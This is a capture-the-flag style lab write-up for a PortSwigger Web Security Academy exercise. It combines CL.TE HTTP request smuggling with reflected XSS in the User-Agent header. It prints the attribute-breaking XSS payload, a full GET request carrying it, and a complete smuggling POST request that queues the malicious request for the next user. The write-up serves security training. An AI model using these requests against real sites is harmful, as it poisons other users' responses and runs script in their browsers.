
# 11 - Exploiting HTTP request smuggling to deliver reflected XSS

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).

Note: The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling

- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#demo

- https://portswigger.net/web-security/request-smuggling/exploiting




![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/1.png)

---------------------------------------------

Generated link: https://0a1700ce0389844181edcf97005800c5.web-security-academy.net/

There is a functionality to post a comment:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/2.png)

It is a POST request. We see the User Agent in a parameter:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/3.png)

We intercept and change the User Agent when accessing “/post?postId=6”:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/4.png)

And the parameter “UserAgent” in the POST request to post the comment is now the XSS payload:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/5.png)

So the User Agent is stored and sent when creating the comment. If we set a random value and read the code of the page we can see it is stored as a hidden value in HTML:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/6.png)

We see the value "TESTING":



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/7.png)

We can try to exploit this with a payload like:

```
useragent"><script>alert(1)</script><a href="/test
```



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/8.png)

And the alert message appears:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/9.png)

The GET request is:

```
GET /post?postId=6 HTTP/2
Host: 0ab30009038a2d4080d2494d0061002a.web-security-academy.net
Cookie: session=wCZh63XkY3fb78PZD4YQHfyiprCzjeko
User-Agent: useragent"><script>alert(1)</script><a href="/test
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ab30009038a2d4080d2494d0061002a.web-security-academy.net/post/comment/confirmation?postId=6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

I will launch HTTP Request Smuggler to try to detect the HTTP smuggling vulnerability:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/10.png)

From the lab description we have this:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/11.png)

In the blog post we can read:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/12.png)

And there are 3 types of HTTP smuggling:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/13.png)

The front-end server doesn't support chunked encoding so the result from the Burp extension is CL.TE:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/14.png)

How to exploit it:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/15.png)

We try to send the malicious GET request after a 0 in the POST request:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/16.png)

If we visit the website we get an invalid request response:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/17.png)

I had to add the Content-Length and at least one character:



![img](images/11%20-%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/18.png)

```
POST / HTTP/1.1
Host: 0ab30009038a2d4080d2494d0061002a.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 120

0

GET /post?postId=6 HTTP/1.1
User-Agent: useragent"><script>alert(1)</script><a href="/test
Content-Length: 3

a
```